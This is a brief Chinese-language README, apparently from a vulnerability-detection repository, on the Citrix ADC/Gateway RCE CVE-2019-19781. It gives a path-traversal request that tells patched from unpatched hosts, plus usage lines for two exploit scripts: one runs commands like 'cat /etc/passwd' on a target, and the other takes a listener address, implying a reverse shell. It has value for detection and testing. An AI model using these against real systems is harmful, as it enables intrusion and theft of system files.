# Citrix Application Delivery Controller和Citrix Gateway的RCE

检测有无补丁:
```  
GET /vpn/../vpns/cfg/smb.conf  
patch>>403  
no patch 200  
```  
无补丁：  
![image](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Citrix/pic/patch.png)
exp1：  
```
usage: bash CVE-2019-19781.sh XX.XX.XX.XX 'cat /etc/passwd'
```
  
exp2:  
```
usage: citrixmash.py [-h] targetip targetport listenip listenport
```